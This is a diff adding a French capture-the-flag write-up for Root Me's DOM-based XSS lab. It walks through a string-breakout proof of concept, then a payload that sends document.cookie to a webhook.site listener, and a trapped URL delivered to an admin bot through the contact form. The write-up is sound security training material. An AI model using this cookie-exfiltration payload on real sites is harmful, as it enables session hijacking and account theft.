@@ -232,3 +232,47 @@ Le texte est inséré à l'intérieur d'une balise existante, ici une image, si 
 ## Root Me : XSS DOM-based Lab
 
 <https://www.root-me.org/fr/Challenges/Web-Client/XSS-DOM-Based-Introduction>
+
+**Contexte :** Le but du challenge est de récupérer le cookie de session de l'administrateur en exploitant une vulnérabilité XSS de type DOM (Document Object Model).
+
+### Étape 1 : Analyse et Proof of Concept (PoC)
+
+- **Observer le comportement :** Il faut d'abord interagir normalement avec l'application. En soumettant une valeur (ex: `42`), on remarque que cette dernière est directement reflétée dans l'URL en tant que paramètre (`?number=42`). <http://challenge01.root-me.org/web-client/ch32/?number=42>
+
+- **Inspecter le code source (F12) :** Il est nécessaire de rechercher comment ce paramètre est traité. Dans le code JavaScript de la page, on trouve la ligne suivante :
+`var number = '42';`
+La valeur de l'URL est directement injectée entre des guillemets simples, sans aucun filtrage.
+
+![script](/images/2026-03-16-18-40-09.png)
+
+- **Forger l'évasion (PoC) :** Pour prouver que l'on peut exécuter du code, il faut "casser" cette ligne de code en injectant la payload suivante à la place du chiffre `42` dans l'URL :
+`42'; alert(1); //`
+- `'` permet de fermer prématurément la variable du développeur.
+- `;` termine l'instruction JavaScript.
+- `alert(1)` est le code injecté pour tester l'exécution.
+- `//` permet de commenter le reste de la ligne d'origine pour éviter une erreur de syntaxe qui bloquerait le script.
+
+L'URL <http://challenge01.root-me.org/web-client/ch32/?number=42%27;%20alert(1);%20//> ou l'injection `42'; alert(1); //` dans la boite nous renvois bien une **alert(1)**
+
+### Étape 2 : Préparation de l'exfiltration
+
+- Faire apparaître une alerte locale n'est pas suffisant pour voler une information. Il faut exfiltrer le cookie vers un serveur externe.
+- **Créer un serveur d'écoute :** Il est recommandé d'utiliser un service gratuit comme `Webhook.site` pour générer une URL de réception unique.
+- **Créer le script malveillant :** Il faut remplacer la fonction `alert(1)` par une instruction qui redirigera la victime vers le serveur d'écoute en passant son cookie en paramètre :
+`document.location='https://webhook.site/628ac341-f1a1-4864-b71b-2c0f0eecf882/?c='+document.cookie`
+- **Générer l'URL piégée finale :**
+
+```sh
+http://challenge01.root-me.org/web-client/ch32/?number=42';document.location='https://webhook.site/628ac341-f1a1-4864-b71b-2c0f0eecf882/?c='%2Bdocument.cookie;//
+```
+
+### Étape 3 : Exploitation via le vecteur d'attaque
+
+- **Trouver le point de contact :** Il faut repérer un moyen de faire visiter cette URL à l'administrateur. Le lien "Contact" présent sur la page d'accueil sert de vecteur.
+- **Envoyer le piège :** Il suffit de soumettre l'URL piégée complète dans le formulaire de contact.
+
+![contact](/images/2026-03-16-19-03-07.png)
+
+- **Récupérer le flag :** Le robot (simulant l'administrateur) va cliquer sur le lien. Son navigateur va interpréter le JavaScript modifié et envoyer automatiquement son cookie de session vers le serveur `Webhook.site`. Il ne reste plus qu'à consulter les logs du Webhook pour récupérer le "flag" et valider le challenge.
+
+![flag](/images/2026-03-16-19-03-52.png)
